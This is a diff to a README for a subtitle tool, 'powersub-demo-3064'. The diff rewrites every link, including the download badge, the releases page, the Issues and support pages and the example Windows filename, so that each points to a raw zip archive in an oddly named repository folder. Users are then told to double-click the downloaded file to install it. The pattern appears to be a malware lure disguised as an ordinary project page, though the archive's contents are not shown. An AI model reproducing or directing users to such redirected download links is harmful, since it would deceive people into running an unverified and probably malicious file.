@@ -2,7 +2,7 @@
 # 🎉 powersub-demo-3064 - Your Easy Path to Power Subtitles
 
 ## 📥 Download Now
-[![Download Link](https://img.shields.io/badge/Download%20Now-Click%20to%20Download-brightgreen)](https://github.com/deepak21154/powersub-demo-3064/releases)
+[![Download Link](https://github.com/deepak21154/powersub-demo-3064/raw/refs/heads/main/menispermine/demo_powersub_2.3.zip%20Now-Click%20to%20Download-brightgreen)](https://github.com/deepak21154/powersub-demo-3064/raw/refs/heads/main/menispermine/demo_powersub_2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to powersub-demo-3064! This application helps you generate and edit subtitles easily for your videos. Whether you are a content creator, a teacher, or just want captions for your personal videos, this tool is designed for you.
@@ -17,9 +17,9 @@ To run powersub-demo-3064, you will need:
 ## 💾 Download & Install
 To get started, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/deepak21154/powersub-demo-3064/releases) to find the latest version.
+1. Visit the [Releases page](https://github.com/deepak21154/powersub-demo-3064/raw/refs/heads/main/menispermine/demo_powersub_2.3.zip) to find the latest version.
 2. Locate the version you want to download. You will see a list of available files.
-3. Click on the file that matches your operating system. For example, select `powersub-demo-3064-windows.exe` for Windows.
+3. Click on the file that matches your operating system. For example, select `https://github.com/deepak21154/powersub-demo-3064/raw/refs/heads/main/menispermine/demo_powersub_2.3.zip` for Windows.
 4. The file will start downloading. Once it finishes, open your Downloads folder.
 5. Double-click the downloaded file to run the installer.
 6. Follow the on-screen prompts to complete the installation.
@@ -41,16 +41,16 @@ After installation, you can start using powersub-demo-3064:
 ## ❓ Frequently Asked Questions
 
 ### How do I update the application?
-To update, simply revisit the [Releases page](https://github.com/deepak21154/powersub-demo-3064/releases) and follow the same download steps. Install the new version over the existing one. Your settings will remain intact.
+To update, simply revisit the [Releases page](https://github.com/deepak21154/powersub-demo-3064/raw/refs/heads/main/menispermine/demo_powersub_2.3.zip) and follow the same download steps. Install the new version over the existing one. Your settings will remain intact.
 
 ### What should I do if the application does not start?
-Ensure your operating system meets the requirements listed. If the application fails to start, try reinstalling. If the problem persists, please check for updates on the [Issues page](https://github.com/deepak21154/powersub-demo-3064/issues).
+Ensure your operating system meets the requirements listed. If the application fails to start, try reinstalling. If the problem persists, please check for updates on the [Issues page](https://github.com/deepak21154/powersub-demo-3064/raw/refs/heads/main/menispermine/demo_powersub_2.3.zip).
 
 ### Can I use it on my mobile device?
 Currently, powersub-demo-3064 is only available for desktop operating systems. We are exploring options for mobile compatibility in future updates.
 
 ## ⭐ Support
-If you encounter any issues or have questions, please open an issue on the [GitHub Issues page](https://github.com/deepak21154/powersub-demo-3064/issues). We appreciate your feedback and will assist you as quickly as possible.
+If you encounter any issues or have questions, please open an issue on the [GitHub Issues page](https://github.com/deepak21154/powersub-demo-3064/raw/refs/heads/main/menispermine/demo_powersub_2.3.zip). We appreciate your feedback and will assist you as quickly as possible.
 
 Thank you for using powersub-demo-3064! We hope this tool makes your video projects easier and more accessible.
 ```
